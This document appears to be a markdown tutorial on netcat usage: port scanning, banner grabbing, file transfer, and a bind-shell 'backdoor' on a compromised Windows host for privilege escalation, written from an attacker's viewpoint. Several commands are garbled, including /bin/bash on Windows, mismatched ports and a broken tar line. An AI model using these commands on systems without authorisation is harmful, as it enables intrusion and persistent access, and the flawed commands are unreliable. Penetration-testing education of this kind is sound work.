# Using Netcat for port scanning
The most basic form of command is:
`# nc [options] host port(s)`
options are described below
host can be either an IP address or valid hostname
Ports can be a single port or a range of ports such as 20-53 or individual ports separated by spaces.

### Let's get started
A small tool that can do remote port scanning would be nice to have and Netcat can fill this role very well and a lot of other ones.

A typical command to perform port scanning would be:
`# nc -v -w 3 -z 192.168.1.69 20-150`
The first portion of the command line that says: nc -v -w 3 which simply tells Netcat to give us more verbose feedback and to timeout after 3 seconds if no connections could be established.

The -z switch prevent Netcat from sending any data to a TCP connection and it will only send very limited data to a UDP connection.

Here is another example: you will use UDP protocol instead of the TCP protocol.
`# nc -v -w 3 -z -u 192.168.1.69 20-100`

### Using Netcat for banner grabbing
Another neat usage of Netcat is for banner grabbing(technique to glean information of the system on the Internet)
`# nc -v -n 192.168.1.69 80
GET / HTTP/1.1\n\n`
Once connected above you simply issued the command: GET HTTP

### Combining both port scan and banner identification
Now we will combine both Port Scan and banner identification.
```bash
# echo -en "GET / HTTP/1.1\n\n" | nc -v -n 216.58.199.228 80
```

### Using Netcat to transfer files
Netcat can be used as well to transfer files between two hosts. It can be a very effective tool to transfer the files that you need in order to escalate your privileges on a remote host.
Let's suppose we have the following scenario. You have a Windows host that you successfully compromised and you wish to transfer additional tools to it in order to escalate your privileges.
on the remote host:
`# nc -l -p 53 > toolkit.zip`
on the local host:
`# nc [remote host] 53 < toolkit.zip`

### Setting up a backdoor
You have compromised a Windows host and you wish to establish a backdoor that you will be able to connect to from your BackTrack attack machine.
on the compromised windows host:
`# nc -l -p 80 -d -e /bin/bash`
on the local host:
`# nc [remote host] 80`
`ls`

### Creating a backup on a remote machine
First you must setup a listener on the host that will receive the files. After issuing the 
`nc -l 134 | tar xvfp -` command. it seems like no activity is taking place. As soon as the transfer is initiated on the remote side you will set a list of files as they are sent across the Netcat pipe.
on the remote host:
```bash
nc -l -p 1234 | tar xvfp -
```
on the local host:
```bash
tar cfp * | nc -w 3 [remotehost]
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTk0ODExNTQ4NCwtOTgwOTY1ODUsMTQ1Nj
A0MTYxNSwtMjAzMzgyOTIzLC0zMTc0MDE0ODEsNTc4NTkzODQy
LDExOTkyNTM5NzAsOTQ2MDIyMzIzLDEzNzI5ODYyMDBdfQ==
-->